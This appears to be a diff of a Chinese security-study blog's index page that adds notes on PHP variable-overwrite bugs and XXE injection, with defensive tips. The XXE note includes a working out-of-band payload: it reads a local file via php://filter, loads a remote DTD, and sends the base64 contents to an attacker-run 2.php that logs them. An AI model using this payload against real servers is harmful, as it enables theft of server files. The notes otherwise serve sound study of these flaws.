@@ -160,6 +160,209 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-变量覆盖漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">变量覆盖漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/06/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2020-04-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>概念：</strong>变量覆盖指的是可以用我们的传参值替换程序原有的变量值。<a href="#$$">从代码角度理解变量覆盖</a>。</p>
+<p><strong>原理：</strong>程序对变量或者某些操作变量函数的使用不当，导致用户对变量可控，构造恶意传参，从而覆盖变量，造成影响。<br><strong>场景：</strong><br>&emsp;&emsp;经常导致变量覆盖漏洞场景有：<code>$$</code>使用不当，<code>extract()</code>函数使用不当，<code>parse_str()</code>函数使用不当<code>import_request_variables()</code>使用不当，开启了全局变量注册等。</p>
+<h5 id="通常情况下，以下四种情况可能造成变量覆盖漏洞"><a href="#通常情况下，以下四种情况可能造成变量覆盖漏洞" class="headerlink" title="通常情况下，以下四种情况可能造成变量覆盖漏洞"></a>通常情况下，以下四种情况可能造成变量覆盖漏洞</h5><ul>
+<li>使用了<code>$$</code></li>
+<li>使用了<code>int extract(array $var_array [,int $type [,string $prefix]])</code>函数</li>
+<li>使用了<code>void parse_str(string $str [,array &amp;$arr])</code>函数</li>
+<li>使用了<code>bool import_request_variables(string types [, string prefix])</code>函数</li>
+</ul>
+<p>下面逐个进行介绍<br>&emsp;&emsp;1.<code>$$</code>:一个<code>$</code>表示变量，在一个变量<code>$a</code>前加上一个<code>$</code>，结果为将变量<code>$a</code>的值作为变量名，新生成一个变量。<br><strong>例子</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	$a = <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'_COOKIE'</span>,<span class="hljs-string">'_POST'</span>,<span class="hljs-string">'_GET'</span>) <span class="hljs-keyword">as</span> $_request) &#123;<br>	<span class="hljs-keyword">foreach</span>($$_request <span class="hljs-keyword">as</span> $_key=&gt;$_value) <br>	&#123;$$_key=addslashes($_value);&#125;&#125;<br>	<span class="hljs-keyword">echo</span> $a;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这段代码作用是依次将接收到的GET传参、POST传参、Cookie传参放到变量数组<code>$$_request</code>中，并以当前的<code>$_request</code>数组中的值<code>&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;</code>变成<code>$$_request</code>作为键名<code>$_key</code>(即<code>&#39;$_COOKIE&#39;,&#39;$_POST&#39;,&#39;$_GET&#39;</code>)去进行遍历，而<code>$$_key</code>则是以上述键名作为变量名进行操作，当传参中包含<code>$a</code>时，代码中的变量<code>$a</code>的值就会被覆盖成传参中<code>$a</code>的值。危害是可以造成任意变量注册。<br>&emsp;&emsp;2.<code>int extract(array $var_array [,int $type [,string $prefix]])</code>函数：将变量从数组导入当前的符号表。简单来说就是以参数键值对数组的所有键名作为变量名生成变量，并将键名所对应的键值赋值给以对应键名作为变量名的变量。<br>&emsp;&emsp;其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是<code>EXTR_OVERWRITE</code>(默认值)及<code>EXTR_SKIP</code>，当值为<code>EXTR_OVERWRITE</code>时，如果变量名发生冲突，则覆盖已有变量；当值为<code>EXTR_SKIP</code>时，则不覆盖。<br><strong>例子</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	$a = <span class="hljs-string">"1"</span>;<br>	$b = <span class="hljs-string">"2"</span>;<br>	$c = <span class="hljs-string">"3"</span>;<br>	$my_array = <span class="hljs-keyword">array</span>(<span class="hljs-string">"a"</span> =&gt; <span class="hljs-string">"Cat"</span>,<span class="hljs-string">"b"</span> =&gt; <span class="hljs-string">"Dog"</span>, <span class="hljs-string">"c"</span> =&gt; <span class="hljs-string">"Horse"</span>);<br>	extract($my_array);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"\$a = $a; \$b = $b; \$c = $c"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这段代码的输出结果为<code>$a = Cat; $b = Dog; $c = Horse</code>，因为<code>extract()</code>函数使得变量<code>$a</code>，<code>$b</code>，<code>$c</code>的值被覆盖。<br>&emsp;&emsp;3.<code>void parse_str(string $str [,array &amp;$arr])</code>函数：解析URL的传参，将形如<code>name=admin</code>的查询字符串解析成传参变量<code>$name=admin</code>。如果指定了第二个参数，则会将解析后的变量存入该数组变量中。<br><strong>例子</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	parse_str(<span class="hljs-string">"name=zkaq&amp;&amp;age=60"</span>);<br>	<span class="hljs-keyword">echo</span> $name.<span class="hljs-string">"&lt;br&gt;"</span>; <span class="hljs-comment">//结果为zkaq </span><br>	<span class="hljs-keyword">echo</span> $age;<span class="hljs-comment">//结果为60</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>&emsp;&emsp;那么，如果在parse_str中可以直接控制传参，就也可以实现变量覆盖。<br>&emsp;&emsp;4.<code>bool import_request_variables(string types [, string prefix])</code>函数：有顺序地注册全局变量集合(<code>types</code>)，还可以为每个导入的变量添加指定前缀(<code>prefix</code>)。<br>&emsp;&emsp;参数中types字符串中允许为G、P、C字符，或者3个字符间任意的组合。其中，“G”表示GET变量，“p”表示POST变量，“C”表示Cookie。注意：3个字符的排列顺序是有区别的，当使用“PG”时传参的参数名字相同时，POST参数值会覆盖GET参数值。比较少见，简单了解。</p>
+<h4 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h4><ul>
+<li>重视变量以及可能造成变量覆盖漏洞的函数和方法的使用。</li>
+<li>关闭register_global配置。</li>
+<li>对用户可控的变量进行严格的过滤检查,甚至避免用户对变量可控。</li>
+<li>对变量进行初始化。</li>
+</ul>
+<div id="$$"><理解变量覆盖></div>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	$array=<span class="hljs-keyword">array</span>(<span class="hljs-string">"a"</span>=&gt;<span class="hljs-string">"1"</span>);<br>	<span class="hljs-comment">//生成一个键值对(一个键名与键值的组合)数组，=&gt;相当于一个索引连接符，这里a为数组中其中一个键名，1为其对应的值</span><br>	<span class="hljs-comment">//当我们需要使用数组中的值时，只需要用数组名['值所对应的键名']即可</span><br>	<span class="hljs-keyword">echo</span> $array[<span class="hljs-string">'a'</span>].<span class="hljs-string">"&lt;br&gt;"</span>;<br>	<span class="hljs-comment">//输出在array数组中键名为a所对应的键值，结果为1</span><br>	<span class="hljs-comment">//而$_GET、$_POST、$_COOKIE都是键值对数组，接收的传参参数名为键名，参数值为键值。</span><br>	<br>	<span class="hljs-comment">//向此网页做如下输出结果的传参(可修改)</span><br>	<span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'name'</span>].<span class="hljs-string">"&lt;br&gt;"</span>; <span class="hljs-comment">//name=&gt;123</span><br>	<span class="hljs-keyword">echo</span> $_POST[<span class="hljs-string">'pwd'</span>].<span class="hljs-string">"&lt;br&gt;"</span>; <span class="hljs-comment">//pwd=&gt;456</span><br>	<span class="hljs-keyword">echo</span> $_COOKIE[<span class="hljs-string">'a'</span>].<span class="hljs-string">"&lt;br&gt;"</span>; <span class="hljs-comment">//a=&gt;12345678</span><br>	<br>	<span class="hljs-comment">//先来看看foreach(array('_COOKIE','_POST','_GET') as $_request)</span><br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'_COOKIE'</span>,<span class="hljs-string">'_POST'</span>,<span class="hljs-string">'_GET'</span>) <span class="hljs-keyword">as</span> $_request) &#123;  <br>		<span class="hljs-keyword">echo</span> $_request.<span class="hljs-string">"&lt;br&gt;"</span>;<br>		<span class="hljs-comment">/*<br>			输出结果为<br>			    _COOKIE<br>			    _POST<br>			    _GET<br>		*/</span><br>	&#125;<br>	<span class="hljs-comment">//生成一个数组$request，将'_COOKIE','_POST','_GET'作为键名</span><br>	<br>	$a = <span class="hljs-number">1</span>; <br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"\$a="</span>.$a.<span class="hljs-string">"&lt;br&gt;"</span>; <span class="hljs-comment">//声明一个变量$a，此时变量$a的值为1 </span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'_COOKIE'</span>,<span class="hljs-string">'_POST'</span>,<span class="hljs-string">'_GET'</span>) <span class="hljs-keyword">as</span> $_request) &#123;  <br>		<span class="hljs-keyword">foreach</span>($$_request <span class="hljs-keyword">as</span> $_key=&gt;$_value) <br>		&#123;<br>		<span class="hljs-comment">//$_request的值为_COOKIE、_POST、_GET 那么$$_request的值为$_COOKIE、$_POST、$_GET</span><br>		<span class="hljs-comment">//那么这个foreach循环实际上遍历的是数组$_COOKIE、$_POST、$_GET</span><br>			<span class="hljs-keyword">echo</span> $_key.<span class="hljs-string">"="</span>.$_value;<br>			<span class="hljs-comment">//输出各个数组的键值对</span><br>			<span class="hljs-comment">/*结果为<br>			   a=12345678<br>			   pwd=456<br>			   name=123<br>			*/</span><br>			<br>			$$_key=addslashes($_value); <br>			<span class="hljs-comment">//$_key的值为a、pwd、name，$$_key就是生成变量$a、$pwd、$name,这里的赋值就是对$_key产生变量覆盖</span><br>			<span class="hljs-comment">//由于这里的顺序是$_COOKIE、$_POST、$_GET</span><br>			<span class="hljs-comment">//所以如果三种传参都含有a参数，会以GET&gt;POST&gt;Cookie的顺序进行变量覆盖</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>; <br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"\$a="</span>.$a.<span class="hljs-string">"&lt;br&gt;"</span>; <br>	<span class="hljs-comment">/*最初变量$a=1,但是当我们向GET、POST、Cookie传参a参数时<br>	上述代码就会新生成一个$a并且赋值我们传参的值<br>	在这里，此时再输出变量$a，此时变量$a的值为COOKIE传参中的值12345678<br>	*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<br><br><br>
+<font face="Georgia" color=#c4444>安全问题产生于不正当的传参。</font>
+
+<p>作者：WebDogC<br>参考书籍《白帽子讲Web安全》</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">变量覆盖、白帽子讲Web安全、note、security</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/06/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-XML注入(XXE)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/01/XML%E6%B3%A8%E5%85%A5(XXE)/">XML注入(XXE)</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/01/XML%E6%B3%A8%E5%85%A5(XXE)/" class="archive-article-date">
+  	<time datetime="2020-03-31T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p><strong>定义</strong>：EXtensible Markup Language(XML)，可扩展标记语言，用于存储数据。</p>
+<p><strong>XML文档组成</strong><br>&emsp;&emsp;1.XML声明 文档相关信息<br>&emsp;&emsp;2.DTD部分 定义XML变量<br>&emsp;&emsp;3.XML部分 具体数据<br>&emsp;&emsp;<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code><br>&emsp;&emsp;在XML实体中，可以使用协议进行外部引用，关键字<code>SYSTEM</code>会令XML解析器从URI/URL中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过发送构造实体给应用程序，然后让应用程序去呈现实体中的代码来实现攻击。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件)，以达获取敏感信息、内网渗透等恶意目的。</p>
+<h4 id="SYSTEM支持的协议"><a href="#SYSTEM支持的协议" class="headerlink" title="SYSTEM支持的协议"></a>SYSTEM支持的协议</h4><ul>
+<li>libxml2：file、http、ftp</li>
+<li>PHP：file、http、ftp、php、data、glob、phar、compress.zlib、compress.bzip2</li>
+<li>Java：http、https、ftp、file、jar、netdoc、mailto、gopher</li>
+<li>.NET：file、http、https、ftp</li>
+</ul>
+<p>———-分割线————-</p>
+<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><p><strong>简述</strong><br>&emsp;&emsp;XXE注入即XML External Entity 外部实体注入，实质是XML注入。<br>&emsp;&emsp;通常在PHP中，使用<code>simplexml_load_string</code>函数的地方会造成XXE注入漏洞。<br>&emsp;&emsp;在php中，存在函数<code>simplexml_load_string</code>，其作用是转换形式良好的 <code>XML</code> 字符串为 <code>SimpleXMLElement</code> 对象。如果成功则返回 <code>SimpleXMLElement</code> 对象，如果失败则返回 FALSE。</p>
+<p><strong>用法：</strong><br>&emsp;&emsp;simplexml_load_string($str, ‘SimpleXMLElement’, LIBXML_NOENT),将xml形式的字符串str，转换成<code>SimpleXMLElement</code> 对象。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>	<br>	$test = <span class="hljs-string">'&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM "file:///c:/1.txt"&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;'</span>;<br>	$obj = simplexml_load_string($test, <span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOENT);<br>	print_r($obj);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>分析：</strong><br>&emsp;&emsp;变量<code>$test</code>是一个内容为XML代码(使用file协议读取文件<code>c:/1.txt</code>)的字符串，使用<code>simplexml_load_string</code>将字符串转化为<code>SimpleXMLElement</code>对象，并复制给<code>$obj</code>，然后打印<code>$obj</code>，输出内容为<code>c:1.txt</code>文件内容。<br>&emsp;&emsp;在多数情况下，后端语言解析了XML后并不会直接输出，这时需要用到一个类似XSS平台一样的接收平台，XML读取数据然后发送到接收平台，要查看的数据就会被保存在平台内，这过程又类似反弹注入。</p>
+<p><strong>漏洞原理：</strong><br>&emsp;&emsp;与注入攻击一致，程序在解析输入的XML数据时，解析了攻击者使用伪造的外部实体而产生的漏洞。</p>
+<h4 id="XXE注入攻击过程"><a href="#XXE注入攻击过程" class="headerlink" title="XXE注入攻击过程"></a>XXE注入攻击过程</h4><p>&emsp;&emsp;将xml文档内容作为一个字符串赋值给一个变量<code>$test</code>，xml文档代码包括访问我们所需要的数据文件的执行代码，接着由<code>simplexml_load_string</code>将<code>$test</code>转化为可输出的<code>SimpleXMLElement</code>对象，输出此对象，服务器会去执行xml文档中的代码即访问指定文件并将此输出，由于多数情况下网页不会直接输出数据结果，所以在<code>$test</code>的xml代码中加上访问一个公网上的中介xml文档的代码，而这个中介xml文档的作用是将接收读取的数据文件并写入到可见文件中，这就实现了读取服务器上的文件内容。</p>
+<p><strong>举例</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">注入payload<br><span class="hljs-meta">&lt;?php</span><br>	$test =<span class="hljs-string">&lt;&lt;&lt;EOF<br>	&lt;?xml version="1.0"?&gt;<br>	&lt;!DOCTYPE ANY[<br>	&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/1.txt"&gt;<br>	&lt;!ENTITY % remote SYSTEM "http://···/xxe/1.xml"&gt; <br>	%remote;<br>	]&gt;<br>	EOF;<br>	<span class="hljs-subst">$obj</span> = simplexml_load_string(<span class="hljs-subst">$test</span>, 'SimpleXMLElement', LIBXML_NOENT);<br>?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">1.xml<br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">all</span><br><span class="hljs-meta-string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://·····/xxe/2.php?id=%file;'&gt;"</span><br>&gt;</span><br>%all;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">2.</span>php<br><span class="hljs-meta">&lt;?php</span> file_put_contents(<span class="hljs-string">"3.txt"</span>,$_GET[<span class="hljs-string">"id"</span>],FILE_APPEND);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>分析</strong><br>&emsp;&emsp;变量$test是一个以xml代码文档为内容的字符串，<code>&lt;&lt;&lt;EOF···EOF</code>表示在EOF之间的内容全是字符串。在xml文档中，声明了变量<code>%file</code>，其作用是读取C盘下经过base64加密(便于处理特殊字符)后的<code>1.txt</code>文件内容，还有变量<code>$remote</code>，其作用是访问一个指定域名下的<code>1.xml</code>文件。<code>1.xml</code>文件代码的作用是将<code>%file</code>变量(即读取到的文件内容)以传参的方式传给指定域名的<code>2.php</code>文件中，接下来只要在<code>2.php</code>文件中接收参数并对其进行处理即可获得<code>1.txt</code>文件数据(例如将文件内容写到<code>3.txt</code>文件中)。</p>
+<h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><ol>
+<li>使用开发语言提供的禁用外部实体的方法。</li>
+<li>对用户提交的XML数据进行严格检查及关键词(SYSTEM等)过滤。</li>
+</ol>
+<p><br /><br /><br /><br /></p>
+<blockquote>
+<p>学无止境</p>
+</blockquote>
+<p>作者：WebDogC</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XXE、security、Web安全、note</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/01/XML%E6%B3%A8%E5%85%A5(XXE)/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-File Inclusion" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1266,170 +1469,6 @@
 
 
   
-    <article id="post-Web渗透工程师之路" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/28/Web%E6%B8%97%E9%80%8F%E5%B7%A5%E7%A8%8B%E5%B8%88%E4%B9%8B%E8%B7%AF/">Web渗透工程师之路</a>
-    </h1>
-  
-
-        
-        <a href="/2020/02/28/Web%E6%B8%97%E9%80%8F%E5%B7%A5%E7%A8%8B%E5%B8%88%E4%B9%8B%E8%B7%AF/" class="archive-article-date">
-  	<time datetime="2020-02-28T11:50:45.925Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Basic-Skills"><a href="#Basic-Skills" class="headerlink" title="Basic Skills"></a>Basic Skills</h2><ul>
-<li><p>熟悉主流Web安全漏洞、OWASP TOP 10、业务逻辑漏洞的风险、原理、危害、利用方式及修复方法。</p>
-</li>
-<li><p>熟悉主流的安全工具kali linux、awvs、nessus、metasploit、burpsuite、empire、cobalt strike 、webInspec、nmap，并对其原理有一定了解。 </p>
-</li>
-<li><p>熟悉Windows、Linux系统的操作和安全配置。</p>
-</li>
-<li><p>熟悉渗透测试技术的整体流程、安全测试方法，具备一定的实战经验。</p>
-</li>
-<li><p>熟悉一种或多种主流编程语言(如PHP/Java/Python等)，可开发简单安全工具，能够在代码层面理解漏洞原理。</p>
-</li>
-<li><p>熟悉代码审计的流程、方法及主流代码审计工具的使用，具备php代码审计能力。</p>
-</li>
-</ul>
-<h2 id="Plus-Point"><a href="#Plus-Point" class="headerlink" title="Plus Point"></a>Plus Point</h2><ul>
-<li>Blogs</li>
-<li>English</li>
-<li>独立渗透测试经验</li>
-<li>各漏洞平台上提交漏洞</li>
-<li>SRC经验或者漏洞挖掘经验</li>
-<li>个人开源项目。</li>
-</ul>
-<h2 id="To-myself"><a href="#To-myself" class="headerlink" title="To myself"></a>To myself</h2><p><em>I wanner master English<br>I wanner find loophole<br>I wanner make enough money<br>I wanner be excellent<br>and<br>I will master English<br>I wlll find loophole<br>I will make enough money<br>I will be excellent</em></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">plan</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/28/Web%E6%B8%97%E9%80%8F%E5%B7%A5%E7%A8%8B%E5%B8%88%E4%B9%8B%E8%B7%AF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-我的第一篇博客文章" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/29/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/">我的第一篇博客文章</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/29/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/" class="archive-article-date">
-  	<time datetime="2020-01-29T13:13:41.032Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>title: 我的第一篇博客文章<br>date: 2020-01-29 21: 01: 50<br>tags:</p>
-<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p>内容</p>
-<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><p>内容</p>
-<p>参考文献</p>
-<p>adsadada</p>
-<p>dasdadsdasd：wq<br>是:wq</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/29/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
@@ -1592,6 +1631,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">复现、CTF、study、SQL、XFF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">复现、CTF、study、flag、文件包含</a>
               </li>
             
             <div class="clearfix"></div>
